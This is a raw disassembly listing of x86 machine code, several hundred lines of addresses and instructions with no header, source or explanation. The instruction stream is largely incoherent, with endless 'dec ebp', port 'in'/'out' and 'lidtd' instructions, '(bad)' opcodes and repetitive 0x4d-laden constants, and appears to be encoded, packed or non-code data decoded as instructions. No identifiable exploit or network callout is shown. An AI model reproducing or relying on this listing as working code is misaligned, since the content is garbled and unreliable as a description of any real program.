  42673b:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426741:	or     eax,0x5e4d4d0d
  426746:	pop    ds
  426747:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  42674d:	lea    ecx,[ebp+0x4d]
  426750:	dec    ebp
  426751:	in     eax,dx
  426752:	push   0xffffffe8
  426754:	cmp    ch,0xb9
  426757:	push   eax
  426758:	add    DWORD PTR [ecx*2+0x77804d4d],ecx
  42675f:	jno    0x4267c1
  426761:	jae    0x42679b
  426763:	lea    ecx,[ebp-0x11feaf47]
  426769:	dec    ebp
  42676a:	dec    ebp
  42676b:	dec    ebp
  42676c:	in     eax,dx
  42676d:	mov    dl,0xaa
  42676f:	mov    ecx,0x4d6f0150
  426774:	dec    ebp
  426775:	dec    ebp
  426776:	pusha  
  426777:	push   edi
  426778:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42677e:	out    dx,eax
  42677f:	dec    ebp
  426780:	dec    ebp
  426781:	dec    ebp
  426782:	in     eax,dx
  426783:	mov    dl,0x9d
  426785:	mov    ecx,0x4da60150
  42678a:	dec    ebp
  42678b:	dec    ebp
  42678c:	adc    BYTE PTR [ecx],0xb9
  42678f:	push   eax
  426790:	add    DWORD PTR [ecx],esp
  426792:	dec    ebp
  426793:	dec    ebp
  426794:	dec    ebp
  426795:	pusha  
  426796:	in     eax,dx
  426797:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42679d:	mov    eax,ds:0x534d4d4d
  4267a2:	cld    
  4267a3:	pusha  
  4267a4:	xor    ch,BYTE PTR [esi-0x73]
  4267a7:	lea    edi,[ecx+0x4d710150]
  4267ad:	dec    ebp
  4267ae:	dec    ebp
  4267af:	mov    dl,0x86
  4267b1:	or     al,0x60
  4267b3:	sbb    ebx,DWORD PTR [eax]
  4267b5:	lea    ecx,[ebp-0x6ffeaf47]
  4267bb:	dec    ebp
  4267bc:	dec    ebp
  4267bd:	dec    ebp
  4267be:	pusha  
  4267bf:	fwait
  4267c0:	xchg   BYTE PTR [ebp+0x150b98d],cl
  4267c6:	adc    eax,0x804d4d4d
  4267cb:	lock jno 0x4267bb
  4267ce:	add    eax,0x29bab20d
  4267d3:	push   DWORD PTR [edx+0xd164f50]
  4267d9:	dec    ebp
  4267da:	dec    ebp
  4267db:	xor    BYTE PTR [edi+0x21],0x80
  4267df:	lock and DWORD PTR [ebx-0x4],edx
  4267e3:	mov    dl,0x86
  4267e5:	or     al,0xed
  4267e7:	add    eax,0x29bab20d
  4267ec:	push   DWORD PTR [edx+0x1e4f0f7c]
  4267f2:	or     eax,0x4d4d4d4d
  4267f7:	lea    ecx,[ebp+0xd164f01]
  4267fd:	dec    ebp
  4267fe:	dec    ebp
  4267ff:	or     al,BYTE PTR [eax-0xf7f8e89]
  426805:	jno    0x42685a
  426807:	cld    
  426808:	mov    dl,0x86
  42680a:	or     al,0xed
  42680c:	add    eax,0x29bab20d
  426811:	push   DWORD PTR [edx-0x74b0fef6]
  426817:	or     eax,0x800a4d4d
  42681c:	ja     0x4267e6
  42681e:	or     ch,0x3e
  426821:	cmp    cl,BYTE PTR [ebp+0x194f7c8d]
  426827:	dec    ebp
  426828:	dec    ebp
  426829:	dec    ebp
  42682a:	sar    ch,cl
  42682c:	sbb    al,0x38
  42682e:	dec    ebp
  42682f:	add    DWORD PTR [eax-0x8b2ea89],0x808b7750
  426839:	ja     0x4267c6
  42683b:	dec    edi
  42683c:	push   0xffffffd5
  42683e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42683f:	mov    ds:0x1d4c6957,al
  426844:	in     eax,dx
  426845:	fstp   st(0)
  426847:	mov    esp,0x21f08076
  42684c:	adc    BYTE PTR [edi+0x530de221],0x51
  426853:	popf   
  426854:	push   ebx
  426855:	div    DWORD PTR [edx-0x414dd608]
  42685b:	or     al,0xff
  42685d:	inc    BYTE PTR [eax-0x2e7f3769]
  426863:	cmp    cl,BYTE PTR es:[ebp+0x9a65f8d]
  42686a:	dec    edi
  42686b:	push   0x808d8d2f
  426870:	lock and DWORD PTR [eax+0x51532197],eax
  426877:	mov    dl,0xbe
  426879:	or     al,0x53
  42687b:	div    DWORD PTR [edx-0x100d608]
  426881:	adc    BYTE PTR [edi-0x1a2e7f38],0x3a
  426888:	lea    ecx,[ebp-0xf7f59b0]
  42688e:	and    DWORD PTR [eax+0x51532197],eax
  426894:	mov    dl,0xbe
  426896:	or     al,0x53
  426898:	div    DWORD PTR [edx-0x100d608]
  42689e:	adc    BYTE PTR [edi-0x322e7f38],0x3a
  4268a5:	lea    ecx,[ebp+0x6760a650]
  4268ab:	cmp    BYTE PTR [ebp+0x150b98d],cl
  4268b1:	and    eax,0x804d4d4d
  4268b6:	adc    DWORD PTR [ecx+0x4d290150],edi
  4268bc:	dec    ebp
  4268bd:	dec    ebp
  4268be:	pusha  
  4268bf:	daa    
  4268c0:	cmp    BYTE PTR [ebp+0x150b98d],cl
  4268c6:	sub    eax,0x604d4d4d
  4268cb:	sub    BYTE PTR [eax],bh
  4268cd:	lea    ecx,[ebp-0x3ffeaf47]
  4268d3:	dec    ebp
  4268d4:	dec    ebp
  4268d5:	dec    ebp
  4268d6:	in     eax,dx
  4268d7:	mov    dl,0x4
  4268d9:	mov    ecx,0x4d350150
  4268de:	dec    ebp
  4268df:	dec    ebp
  4268e0:	pusha  
  4268e1:	adc    al,0x38
  4268e3:	lea    ecx,[ebp+0x390150b9]
  4268e9:	dec    ebp
  4268ea:	dec    ebp
  4268eb:	dec    ebp
  4268ec:	in     eax,dx
  4268ed:	mov    dl,0xf3
  4268ef:	mov    ecx,0x4d3d0150
  4268f4:	dec    ebp
  4268f5:	dec    ebp
  4268f6:	pusha  
  4268f7:	sbb    al,0x38
  4268f9:	lea    ecx,[ebp-0x2dfeaf47]
  4268ff:	dec    ebp
  426900:	dec    ebp
  426901:	dec    ebp
  426902:	adc    BYTE PTR [ecx],0xb9
  426905:	push   eax
  426906:	add    DWORD PTR [ebp+0x4d],eax
  426909:	dec    ebp
  42690a:	dec    ebp
  42690b:	pusha  
  42690c:	sbb    BYTE PTR [eax],bh
  42690e:	lea    ecx,[ebp+0x490150b9]
  426914:	dec    ebp
  426915:	dec    ebp
  426916:	dec    ebp
  426917:	pusha  
  426918:	daa    
  426919:	pop    ebp
  42691a:	lea    ecx,[ebp-0x7efeaf47]
  426920:	dec    ebp
  426921:	dec    ebp
  426922:	dec    ebp
  426923:	pusha  
  426924:	push   ebx
  426925:	xor    ecx,DWORD PTR [ebp+0x150b98d]
  42692b:	aam    0x4d
  42692d:	dec    ebp
  42692e:	dec    ebp
  42692f:	cld    
  426930:	ja     0x4268b5
  426932:	mov    ds:0x8d185d60,eax
  426937:	lea    edi,[ecx+0x4d550150]
  42693d:	dec    ebp
  42693e:	dec    ebp
  42693f:	in     eax,dx
  426940:	mov    dl,0x5d
  426942:	mov    ecx,0x4d590150
  426947:	dec    ebp
  426948:	dec    ebp
  426949:	cld    
  42694a:	ja     0x4268f4
  42694c:	or     bh,ah
  42694e:	ja     0x426954
  426950:	xchg   ebp,eax
  426951:	cld    
  426952:	ja     0x426900
  426954:	stos   DWORD PTR es:[edi],eax
  426955:	pusha  
  426956:	(bad)  
  426958:	lea    ecx,[ebp+0x5d0150b9]
  42695e:	dec    ebp
  42695f:	dec    ebp
  426960:	dec    ebp
  426961:	cld    
  426962:	ja     0x4268e8
  426964:	jg     0x4269c6
  426966:	fistp  DWORD PTR [eax-0x73]
  426969:	lea    edi,[ecx+0x4dd60150]
  42696f:	dec    ebp
  426970:	dec    ebp
  426971:	cld    
  426972:	ja     0x42692e
  426974:	popf   
  426975:	cld    
  426976:	ja     0x426970
  426978:	xchg   esi,eax
  426979:	pusha  
  42697a:	inc    edx
  42697b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426981:	gs dec ebp
  426983:	dec    ebp
  426984:	dec    ebp
  426985:	cld    
  426986:	ja     0x42693c
  426988:	xchg   BYTE PTR [eax-0x687f8e10],al
  42698e:	jno    0x4269e3
  426990:	push   ecx
  426991:	push   ebx
  426992:	div    DWORD PTR [edx-0x74df342]
  426998:	sub    edi,edi
  42699a:	inc    ah
  42699c:	fwait
  42699d:	adc    BYTE PTR [edi+0x71e78071],0x53
  4269a4:	jle    0x426958
  4269a6:	pop    es
  4269a7:	or     al,0x53
  4269a9:	mov    esi,DWORD PTR [edx-0x6300d644]
  4269af:	inc    ebx
  4269b0:	dec    BYTE PTR [ecx]
  4269b2:	loopne 0x4269e5
  4269b4:	iret   
  4269b5:	add    DWORD PTR [eax-0x187f8e69],0x71
  4269bc:	push   ebx
  4269bd:	jle    0x426971
  4269bf:	pop    es
  4269c0:	or     al,0x53
  4269c2:	mov    esi,DWORD PTR [edx-0x6300d644]
  4269c8:	and    bh,0x8b
  4269cb:	mov    ds:0x8d8dcd05,al
  4269d0:	lea    esp,[edx-0x7272e14e]
  4269d6:	lea    eax,[ebx-0x7b]
  4269d9:	adc    BYTE PTR [ecx],dh
  4269db:	add    DWORD PTR [bx+si+0x7197],0xffffff80
  4269e1:	lock jno 0x426a37
  4269e4:	jle    0x426a39
  4269e6:	std    
  4269e7:	mov    dl,0xba
  4269e9:	sub    DWORD PTR [edx-0x4900f3f9],esi
  4269ef:	xor    al,0x8b
  4269f2:	in     al,dx
  4269f3:	inc    BYTE PTR [eax-0x187f8e69]
  4269f9:	jno    0x426a4e
  4269fb:	jle    0x426a50
  4269fd:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426a03:	sub    edi,edi
  426a05:	pushf  
  426a06:	in     eax,dx
  426a07:	sti    
  426a08:	out    dx,eax
  426a09:	push   eax
  426a0a:	lock mov esp,DWORD PTR [ebx-0x2]
  426a0e:	in     al,0x1
  426a10:	xor    al,0x71
  426a13:	adc    BYTE PTR [edi+0x53515371],0xf7
  426a1a:	mov    dl,0xbe
  426a1c:	or     al,0xb2
  426a1e:	clc    
  426a1f:	sub    edi,edi
  426a21:	(bad)  
  426a22:	push   eax
  426a23:	add    DWORD PTR [esi],edx
  426a25:	or     eax,0xf0804d4d
  426a2a:	and    DWORD PTR [eax+0x51532197],eax
  426a30:	push   ebx
  426a31:	div    DWORD PTR [edx-0x414dd608]
  426a37:	or     al,0xff
  426a39:	inc    BYTE PTR [ecx]
  426a3b:	xchg   edi,eax
  426a3c:	adc    DWORD PTR [eax+0x16],0x1
  426a40:	push   ds
  426a41:	or     eax,0xb3f14d4d
  426a46:	cmp    BYTE PTR [ebp-0x46017f73],cl
  426a4c:	push   eax
  426a4d:	lock es in eax,dx
  426a50:	mov    dl,0xfb
  426a52:	or     bl,0xb9
  426a55:	push   eax
  426a56:	out    0xf2,eax
  426a58:	add    esi,esp
  426a5a:	add    al,0xb9
  426a5c:	push   eax
  426a5d:	out    0x2e,eax
  426a5f:	in     eax,dx
  426a60:	jl     0x426a50
  426a62:	mov    ecx,0x1f3e750
  426a67:	out    0x15,al
  426a69:	mov    ecx,0xed36e750
  426a6e:	jl     0x426a73
  426a70:	mov    ecx,0x80f4e750
  426a75:	retf   
  426a76:	mov    ecx,0x803ee750
  426a7b:	test   DWORD PTR [ecx-0x7f0a18b0],edi
  426a81:	push   es
  426a82:	mov    ecx,0x8046e750
  426a87:	test   DWORD PTR [ecx-0x7f9d18b0],edi
  426a8d:	retf   
  426a8e:	mov    ecx,0x1dee750
  426a93:	out    0xf2,al
  426a95:	mov    ecx,0xed56e750
  426a9a:	jl     0x426a8a
  426a9c:	mov    ecx,0x1e0e750
  426aa1:	out    0x7a,al
  426aa3:	mov    ecx,0xed5ee750
  426aa8:	jl     0x426aad
  426aaa:	mov    ecx,0xb9f1e750
  426aaf:	push   eax
  426ab0:	lock mov cx,0x9750
  426ab5:	cli    
  426ab6:	adc    BYTE PTR [ecx],0xb9
  426ab9:	push   eax
  426aba:	lock push 0xffffff80
  426abd:	lock and DWORD PTR [eax-0x8acde69],eax
  426ac4:	push   ebx
  426ac5:	push   ecx
  426ac6:	mov    dl,0xf8
  426ac8:	sub    DWORD PTR [edx-0x100f342],esi
  426ace:	adc    BYTE PTR [edi+0x21e78021],0x53
  426ad5:	jle    0x426a89
  426ad7:	pop    es
  426ad8:	or     al,0x1
  426ada:	xor    eax,esi
  426adc:	bound  edx,QWORD PTR [ebx-0x75]
  426adf:	mov    dl,0xbc
  426ae1:	sub    edi,edi
  426ae3:	pushf  
  426ae4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426ae8:	pushf  
  426ae9:	mov    ecx,0xf0800e50
  426aee:	and    DWORD PTR [eax+0x51532197],eax
  426af4:	push   ebx
  426af5:	div    DWORD PTR [edx-0x74df342]
  426afb:	sub    edi,edi
  426afd:	inc    BYTE PTR [eax+0x31012197]
  426b03:	lock es push ebx
  426b06:	jle    0x426a88
  426b08:	out    0x21,eax
  426b0a:	mov    dl,0x7
  426b0c:	or     al,0x53
  426b0e:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b14:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426b18:	pushf  
  426b19:	mov    ecx,0xf0800e50
  426b1e:	and    DWORD PTR [eax-0x8acde69],eax
  426b24:	mov    dl,0xf8
  426b26:	sub    DWORD PTR [ebx+0x51],edx
  426b29:	mov    dl,0xbe
  426b2b:	or     al,0xff
  426b2d:	inc    BYTE PTR [eax-0x187fde69]
  426b33:	and    DWORD PTR [ebx+0x7e],edx
  426b36:	mov    dl,0x7
  426b38:	or     al,0x53
  426b3a:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b40:	mov    ecx,0x52974150
  426b45:	or     eax,0xf0804d4d
  426b4a:	and    DWORD PTR [eax-0x8acde69],eax
  426b50:	mov    dl,0xf8
  426b52:	sub    DWORD PTR [ebx+0x51],edx
  426b55:	mov    dl,0xbe
  426b57:	or     al,0xff
  426b59:	inc    BYTE PTR [eax-0x187fde69]
  426b5f:	and    DWORD PTR [ebx+0x7e],edx
  426b62:	mov    dl,0x7
  426b64:	or     al,0x53
  426b66:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b6c:	mov    ecx,0xa5974150
  426b71:	or     eax,0xf0804d4d
  426b76:	jno    0x426af8
  426b78:	xchg   edi,eax
  426b79:	jno    0x426bce
  426b7b:	not    DWORD PTR [ebx+0x51]
  426b7e:	mov    dl,0xf8
  426b80:	sub    DWORD PTR [edx-0x100f342],esi
  426b86:	adc    BYTE PTR [edi+0x71e78071],0x53
  426b8d:	jle    0x426be2
  426b8f:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426b95:	sub    edi,edi
  426b97:	pushf  
  426b98:	in     al,dx
  426b99:	(bad)  
  426b9a:	push   eax
  426b9b:	add    DWORD PTR [esi],edx
  426b9d:	or     eax,0xf0804d4d
  426ba2:	and    DWORD PTR [eax-0x187fde69],eax
  426ba8:	out    dx,eax
  426ba9:	push   ebx
  426baa:	not    DWORD PTR [ebx+0x51]
  426bad:	mov    dl,0xbe
  426baf:	or     al,0xb2
  426bb1:	clc    
  426bb2:	sub    edi,edi
  426bb4:	inc    BYTE PTR [ecx]
  426bb6:	dec    edi
  426bb7:	push   edx
  426bb8:	or     eax,0xf504d4d
  426bbd:	add    DWORD PTR [esi],ebx
  426bbf:	or     eax,0x77014d4d
  426bc4:	bound  eax,QWORD PTR [esi+0x4d4d61d3]
  426bca:	xor    al,0x71
  426bcd:	adc    BYTE PTR [edi+0x530de271],0x51
  426bd4:	stos   DWORD PTR es:[edi],eax
  426bd5:	push   ebx
  426bd6:	pushf  
  426bd7:	mov    dl,0xbe
  426bd9:	or     al,0xb2
  426bdb:	clc    
  426bdc:	sub    edi,edi
  426bde:	(bad)  
  426bdf:	push   eax
  426be0:	lidtd  [esi]
  426be3:	or     eax,0x77804d4d
  426be8:	and    DWORD PTR [eax-0x3acde10],eax
  426bee:	mov    dl,0x86
  426bf0:	or     al,0x53
  426bf2:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426bf8:	aad    0x3d
  426bfa:	add    DWORD PTR [edi+0x16],ecx
  426bfd:	or     eax,0x800a4d4d
  426c02:	ja     0x426c75
  426c04:	xor    al,0x71
  426c07:	push   ebx
  426c08:	cld    
  426c09:	mov    dl,0x86
  426c0b:	or     al,0x53
  426c0d:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426c13:	or     al,BYTE PTR [ecx]
  426c15:	dec    edi
  426c16:	and    eax,0xa4d4d4d
  426c1b:	xor    BYTE PTR [edi+0x15],0xe2
  426c1f:	lea    ecx,[ebp-0x9]
  426c22:	xor    BYTE PTR [edi+0x21],0x80
  426c26:	lock and DWORD PTR [ebx-0x4],edx
  426c2a:	push   ebx
  426c2b:	sub    al,BYTE PTR [eax-0x794d1019]
  426c31:	or     al,0xb2
  426c33:	mov    edx,0x1b2ff29
  426c38:	add    DWORD PTR [ebp+0x504d4d0d],esp
  426c3e:	inc    ecx
  426c3f:	dec    edi
  426c40:	push   ds
  426c41:	or     eax,0x77014d4d
  426c46:	xchg   BYTE PTR es:0x804d4d88,al
  426c4d:	lock jno 0x426bd0
  426c50:	xchg   edi,eax
  426c51:	jno    0x426ca6
  426c53:	push   ecx
  426c54:	mov    dl,0xbe
  426c56:	or     al,0xed
  426c58:	ret    0xb20d
  426c5b:	clc    
  426c5c:	sub    edi,edi
  426c5e:	(bad)  
  426c5f:	push   eax
  426c60:	lidtd  [esi]
  426c63:	or     eax,0x33f14d4d
  426c68:	cmp    BYTE PTR [ebp+0x386b5e8d],cl
  426c6e:	lea    ecx,[ebp+0xa4f50b9]
  426c74:	dec    ebp
  426c75:	dec    ebp
  426c76:	dec    ebp
  426c77:	add    edx,ebx
  426c79:	jno    0x426c34
  426c7b:	push   eax
  426c7c:	add    DWORD PTR [ebp+0x5e4d4d4d],esi
  426c82:	popa   
  426c83:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426c89:	stos   BYTE PTR es:[edi],al
  426c8a:	dec    ebp
  426c8b:	dec    ebp
  426c8c:	dec    ebp
  426c8d:	cmp    bl,0xb9
  426c90:	push   eax
  426c91:	dec    edi
  426c92:	xchg   ebp,eax
  426c93:	dec    ebp
  426c94:	dec    ebp
  426c95:	dec    ebp
  426c96:	xor    BYTE PTR [edx-0x66b0af47],0x4d
  426c9d:	dec    ebp
  426c9e:	dec    ebp
  426c9f:	in     eax,dx
  426ca0:	push   0x29
  426ca2:	cmp    ch,0xb9
  426ca5:	push   eax
  426ca6:	add    DWORD PTR [ecx+0x14d4d4d],edi
  426cac:	fisubr DWORD PTR [ecx]
  426cae:	mov    ecx,0x4dbd0150
  426cb3:	dec    ebp
  426cb4:	dec    ebp
  426cb5:	in     eax,dx
  426cb6:	mov    dl,0xd6
  426cb8:	mov    ecx,0x4de20150
  426cbd:	dec    ebp
  426cbe:	dec    ebp
  426cbf:	add    edx,ebx
  426cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cc2:	mov    ecx,0x4dc50150
  426cc7:	dec    ebp
  426cc8:	dec    ebp
  426cc9:	or     BYTE PTR [ebx-0x6297af47],0x4d
  426cd0:	dec    ebp
  426cd1:	dec    ebp
  426cd2:	add    esi,esp
  426cd4:	scas   al,BYTE PTR es:[edi]
  426cd5:	pusha  
  426cd6:	dec    ebp
  426cd7:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426cdd:	ror    DWORD PTR [ebp+0x4d],0x4d
  426ce1:	add    edx,ebx
  426ce3:	or     eax,0x520150b9
  426ce8:	dec    ebp
  426ce9:	dec    ebp
  426cea:	dec    ebp
  426ceb:	mov    ecx,0x4dae6850
  426cf0:	dec    ebp
  426cf1:	dec    ebp
  426cf2:	in     eax,dx
  426cf3:	jl     0x426c80
  426cf5:	mov    ecx,0x4da56850
  426cfa:	dec    ebp
  426cfb:	dec    ebp
  426cfc:	or     BYTE PTR [ebx-0x72c783a0],0x8d
  426d03:	mov    ecx,0x4de40150
  426d08:	dec    ebp
  426d09:	dec    ebp
  426d0a:	cmp    ch,0xb9
  426d0d:	push   eax
  426d0e:	add    ebp,edx
  426d10:	dec    ebp
  426d11:	dec    ebp
  426d12:	dec    ebp
  426d13:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426d18:	out    0x4d,al
  426d1a:	dec    ebp
  426d1b:	dec    ebp
  426d1c:	push   ebx
  426d1d:	push   0xffffffb9
  426d1f:	push   eax
  426d20:	push   0x4d4d4da9
  426d25:	add    DWORD PTR [eax-0x1b],ebp
  426d28:	dec    ebp
  426d29:	dec    ebp
  426d2a:	dec    ebp
  426d2b:	jl     0x426d7c
  426d2d:	lods   eax,DWORD PTR ds:[esi]
  426d2e:	dec    ebp
  426d2f:	dec    ebp
  426d30:	dec    ebp
  426d31:	out    0x38,eax
  426d33:	xor    edi,DWORD PTR [eax]
  426d35:	jl     0x426d86
  426d37:	(bad)  [ebp+0x4d]
  426d3a:	dec    ebp
  426d3b:	ret    
  426d3c:	cmp    BYTE PTR [esi-0x7fbb46c8],dl
  426d42:	ja     0x426db5
  426d44:	xor    al,0x71
  426d47:	adc    BYTE PTR [edi+0xd05ed71],0xb2
  426d4e:	mov    edx,0xb2fc5329
  426d53:	xchg   BYTE PTR [edi+edi*8],cl
  426d56:	mov    dl,0x80
  426d58:	lock jno 0x426d48
  426d5b:	add    eax,0xb27e530d
  426d60:	mov    edx,0xc07b229
  426d65:	push   DWORD PTR [esi-0x4128fad]
  426d6b:	sbb    edx,DWORD PTR [ebx]
  426d6d:	jo     0x426dc2
  426d6f:	dec    ebp
  426d70:	arpl   bx,cx
  426d72:	or     esi,ecx
  426d74:	and    cl,BYTE PTR [ebp-0x101b7273]
  426d7a:	arpl   bx,di
  426d7c:	or     ebp,ebp
  426d7e:	cmp    BYTE PTR [ebp-0xf7f7273],cl
  426d84:	jno    0x426d06
  426d86:	xchg   edi,eax
  426d87:	jno    0x426ddc
  426d89:	push   ecx
  426d8a:	mov    dl,0xbe
  426d8c:	or     al,0xed
  426d8e:	ret    0xb20d
  426d91:	clc    
  426d92:	sub    edi,edi
  426d94:	(bad)  
  426d95:	in     al,dx
  426d96:	std    
  426d97:	adc    BYTE PTR [ecx+edi*4+0xaf01653],0x4d
  426d9f:	dec    ebp
  426da0:	dec    ebp
  426da1:	xor    al,0x71
  426da4:	and    bh,0x71
  426da7:	push   ebx
  426da8:	push   ecx
  426da9:	mov    dl,0xbe
  426dab:	or     al,0xed
  426dad:	dec    ebx
  426dae:	or     eax,0xff29bcb2
  426db3:	sub    ch,ah
  426db5:	std    
  426db6:	mov    ecx,0xaf04180
  426dbb:	dec    ebp
  426dbc:	dec    ebp
  426dbd:	dec    ebp
  426dbe:	mov    ecx,0xb2b9b64b
  426dc3:	mov    edx,0x7b6b909
  426dc8:	mov    ecx,0xf080b6ff
  426dcd:	jno    0x426d4f
  426dcf:	out    0x71,eax
  426dd1:	push   ebx
  426dd2:	push   ecx
  426dd3:	mov    dl,0xbe
  426dd5:	or     al,0xed
  426dd7:	dec    ebx
  426dd8:	or     eax,0xff29bcb2
  426ddd:	sub    ch,ah
  426ddf:	std    
  426de0:	mov    ecx,0xaf01650
  426de5:	dec    ebp
  426de6:	dec    ebp
  426de7:	dec    ebp
  426de8:	xor    al,0x71
  426deb:	adc    BYTE PTR [edi-0x12aeac8f],0xc2
  426df2:	or     eax,0xb20cbeb2
  426df7:	clc    
  426df8:	sub    edi,edi
  426dfa:	inc    BYTE PTR [eax-0x4d138e69]
  426e00:	xor    al,0x71
  426e03:	in     eax,dx
  426e04:	add    eax,0xb27e530d
  426e09:	mov    edx,0xc07b229
  426e0e:	push   DWORD PTR [esi-0x4128fad]
  426e14:	sbb    edx,DWORD PTR [ebx]
  426e16:	jo     0x426e6b
  426e18:	dec    ebp
  426e19:	arpl   bx,cx
  426e1b:	or     edx,ebp
  426e1d:	call   0x934c:0x94d4d4d
  426e24:	dec    ebp
  426e25:	dec    ebp
  426e26:	dec    ebp
  426e27:	ins    BYTE PTR es:[edi],dx
  426e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e29:	mov    DWORD PTR [esp+edx*8],0x50767701
  426e30:	ja     0x426e21
  426e32:	xor    BYTE PTR [edi-0x11],0x64
  426e36:	mov    ecx,0x5011df58
  426e3b:	sbb    eax,0x86ee6d7c
  426e40:	pop    DWORD PTR [ebx+0x26]
  426e43:	xor    BYTE PTR [edi+0x76],0x80
  426e47:	lock std 
  426e49:	or     DWORD PTR [esi-0x3],eax
  426e4c:	or     al,0xb2
  426e4e:	mov    esi,0x76f0800c
  426e53:	adc    BYTE PTR [edi+0x537c53fd],0x72
  426e5a:	push   edi
  426e5c:	xor    BYTE PTR [edi-0x38],0xaa
  426e60:	das    
  426e61:	cmp    cl,BYTE PTR es:[ebp+0x4f010a8d]
  426e68:	enter  0x4d0d,0x4d
  426e6c:	or     dh,BYTE PTR [edx+0x778629ba]
  426e72:	mov    edx,0x77804d4d
  426e77:	xchg   DWORD PTR [eax+0x460932f0],eax
  426e7d:	std    
  426e7e:	or     al,0xb2
  426e80:	mov    esi,0x87f0800c
  426e85:	adc    BYTE PTR [edi+0x29bab232],0x80
  426e8c:	add    eax,ecx
  426e8e:	or     eax,0x30804d4d
  426e93:	push   ebx
  426e94:	jl     0x426ee9
  426e96:	jb     0x426e97
  426e98:	sti    
  426e99:	arpl   bp,di
  426e9b:	or     DWORD PTR [edi+0x56],ecx
  426e9e:	lea    ecx,[ebp-0x37287f73]
  426ea4:	jl     0x426f1d
  426ea6:	scas   eax,DWORD PTR es:[edi]
  426ea7:	fst    DWORD PTR [edi-0x21]
  426eaa:	adc    DWORD PTR [esi-0x7a],ebx
  426ead:	pop    DWORD PTR [ebx+0x26]
  426eb0:	push   eax
  426eb1:	ja     0x426eaa
  426eb3:	push   eax
  426eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426eb5:	jp     0x426f07
  426eb7:	ja     0x426e3b
  426eb9:	xor    BYTE PTR [edi+0x7a],0x80
  426ebd:	lock or BYTE PTR [ecx],0x46
  426ec1:	std    
  426ec2:	or     al,0xb2
  426ec4:	mov    esi,0x7af0800c
  426ec9:	adc    BYTE PTR [edi+0x537c5382],0x72
  426ed0:	push   edi
  426ed2:	stos   BYTE PTR es:[edi],al
  426ed3:	dec    ebp
  426ed4:	xlat   BYTE PTR ds:[ebx]
  426ed5:	xor    eax,0x4d29bab2
  426eda:	loopne 0x426f12
  426edc:	cmp    cl,BYTE PTR [ebp-0x7b817973]
  426ee2:	dec    ebp
  426ee3:	dec    ebp
  426ee4:	xor    BYTE PTR [edi+0x7a],0x80
  426ee8:	lock or BYTE PTR [ecx],0x46
  426eec:	std    
  426eed:	or     al,0xb2
  426eef:	mov    esi,0x7af0800c
  426ef4:	adc    BYTE PTR [edi+0x537c5382],0x72
  426efb:	push   edi
  426efd:	stos   BYTE PTR es:[edi],al
  426efe:	dec    ebp
  426eff:	loopne 0x426f37
  426f01:	cmp    cl,BYTE PTR [ebp+0x29bab28d]
  426f07:	dec    ebp
  426f08:	loopne 0x426f38
  426f0a:	cmp    cl,BYTE PTR [ebp-0x7bc17973]
  426f10:	dec    ebp
  426f11:	dec    ebp
  426f12:	or     BYTE PTR [esi+esi*1+0x3a],0x8d
  426f17:	lea    eax,[eax+0x657f80ef]
  426f1d:	in     al,dx
  426f1e:	out    dx,eax
  426f1f:	push   eax
  426f20:	lock out dx,eax
  426f22:	xor    al,0xaf
  426f25:	xor    BYTE PTR [edi-0x9],0x9
  426f29:	inc    esi
  426f2a:	mov    dl,0xc
  426f2c:	mov    dl,0x86
  426f2e:	or     al,0x80
  426f30:	ja     0x426ee1
  426f32:	adc    BYTE PTR [edi-0x4dd5ac09],0x84
  426f39:	sub    DWORD PTR [ebx+0x6a],edx
  426f3c:	push   DWORD PTR [edx+0x9eff080]
  426f42:	pop    esp
  426f43:	jg     0x426f5e
  426f45:	dec    edi
  426f46:	std    
  426f47:	aad    0x21
  426f49:	or     BYTE PTR [edx+eax*4+0x3a],0x8d
  426f4e:	lea    edi,[ebp+ecx*4-0xb]
  426f52:	and    al,0x6f
  426f54:	cmp    BYTE PTR [eax+0x77802177],al
  426f5a:	jno    0x426fa9
  426f5c:	xlat   BYTE PTR ds:[ebx]
  426f5d:	cmp    eax,0x4dc8d74d
  426f62:	xlat   BYTE PTR ds:[ebx]
  426f63:	sub    eax,0x4d25d74d
  426f68:	xlat   BYTE PTR ds:[ebx]
  426f69:	sbb    eax,0x8615d74d
  426f6e:	cmp    cl,al
  426f70:	dec    ebp
  426f71:	dec    ebp
  426f72:	push   eax
  426f73:	dec    edi
  426f74:	xor    cl,BYTE PTR ds:0x77804d4d
  426f7a:	cmp    eax,0x8d15dded
  426f7f:	aad    0x1b
  426f81:	xor    BYTE PTR [edi+0x3d],0xed
  426f85:	frstor ds:0x80a1d58d
  426f8b:	dec    edi
  426f8c:	xor    cl,BYTE PTR ds:0xf0804d4d
  426f92:	cmp    eax,0xc41d9250
  426f97:	dec    DWORD PTR [ebp-0x29]
  426f9a:	cmp    eax,0x86c8d74d
  426f9f:	mov    WORD PTR [edx+0x4d],gs
  426fa2:	dec    ebp
  426fa3:	stos   DWORD PTR es:[edi],eax
  426fa4:	test   eax,0x35fb70a3
  426fa9:	lea    edx,[edi-0x78127880]
  426faf:	and    DWORD PTR [ecx-0x9748884],ebx
  426fb5:	and    al,0x6f
  426fb7:	cmp    BYTE PTR [edi+esi*2-0x38],bh
  426fbb:	cmc    
  426fbc:	and    al,0x6f
  426fbe:	cmp    BYTE PTR [eax-0x287f7489],al
  426fc4:	mov    esp,edx
  426fc6:	or     eax,0x6f242260
  426fcb:	cmp    BYTE PTR [ebx-0x4e],dl
  426fce:	scas   al,BYTE PTR es:[edi]
  426fcf:	push   ebx
